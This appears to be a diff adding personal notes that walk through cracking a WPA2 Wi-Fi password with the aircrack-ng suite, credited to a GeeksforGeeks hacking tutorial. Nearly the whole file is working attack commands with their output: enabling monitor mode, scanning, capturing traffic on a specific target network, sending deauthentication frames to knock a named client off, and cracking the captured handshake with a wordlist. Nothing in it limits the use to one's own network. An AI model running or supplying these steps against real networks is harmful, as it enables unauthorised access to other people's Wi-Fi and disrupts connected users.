@@ -1,0 +1,85 @@
+
+Ctrl + Alt + T  open terminal
+sudo apt update
+sudo apt upgrade
+
+
+
+---------- --------
+
+
+1.sudo ifconfig
+
+.......
+wlp1s0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.13 .......
+
+2. sudo airmon-ng check kill
+output:
+		Killing these processes:
+
+			PID Name
+			1568 wpa_supplicant
+3. airmon-ng start wlp1s0
+output:
+
+	sudo airmon-ng start wlp1s0
+
+
+		PHY	Interface	Driver		Chipset
+
+		phy0	wlp1s0		iwlwifi		Intel Corporation Wireless 8260 (rev 3a)
+				(mac80211 monitor mode vif enabled
+				          for [phy0]wlp1s0 on [phy0]wlp1s0mon)
+				(mac80211 station mode vif disabled
+				          for [phy0]wlp1s0)
+
+  
+4. sudo airodump-ng wlp1s0mon    #  View all the Wifi networks.
+
+output:
+   BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+   3C:7C:3F:B5:F3:A0  -48        6        0    0   3  360   WPA2 CCMP   PSK  BOSS 2.4                                                
+...
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+ 3C:7C:3F:B5:F3:A0  10:D5:61:EC:E6:B8  -64    0 - 1      0        1                                                                 
+ 
+5. To view the clients connected to the target network.
+
+sudo airodump-ng -c 3 --bssid 3C:7C:3F:B5:F3:A0 -w ./  wlp1s0mon
+
+    airodump-ng : For packet capturing
+    -c : Channel  
+    --bssid : MAC address of a wireless access point(WAP).
+    -w : The Directory where you want to save the file(Password File).
+    wlan0mon : Name of the interface.
+ 
+6.  Open a new terminal window to disconnect the clients connected 
+    to the target network.  
+ 
+  sudo aireplay-ng -0 10 -a 3C:7C:3F:B5:F3:A0  -c 10:D5:61:EC:E6:B8 wlp1s0mon
+    
+     aireplay-ng : To inject frames
+    -0 : For deauthentication
+    10 : No. of deauthentication packets to be sent(0 would mean infinite)
+    -a : For the bssid of the target network
+    wlp1s0mon : Name of the interface.
+ 
+  When the client is disconnected from the target network. 
+  He tries to reconnect to the network and when he does you will
+   get something called WPA handshake in the previous window of
+    the terminal. 
+ 
+ 7. To decrypt the password. Open the Files application. 
+ 
+ aircrack-ng -a2 -b  3C:7C:3F:B5:F3:A0 -w /usr/share/metasploit-framework/data/wordlists/common_roots.txt ./-01.cap
+ 
+ aircrack-ng : 802.11 WEP and WPA-PSK keys cracking program
+-a : -a2 for WPA2 & -a for WPA network
+-b : The BSSID of the target network
+-w : Location of the wordlist file
+-01.cap :  cap file
+ 
+ 
+    
+https://www.geeksforgeeks.org/linux-unix/how-to-hack-wpa-wpa2-wifi-using-kali-linux/
